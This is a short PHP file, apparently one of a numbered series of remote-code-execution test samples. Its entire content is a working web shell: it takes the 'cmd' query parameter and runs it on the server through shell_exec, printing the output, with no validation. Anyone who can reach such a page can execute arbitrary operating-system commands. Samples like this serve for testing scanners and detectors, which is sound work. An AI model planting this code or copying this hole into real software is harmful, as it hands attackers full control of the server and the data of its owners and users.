<?php
// RCE test variation #35
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>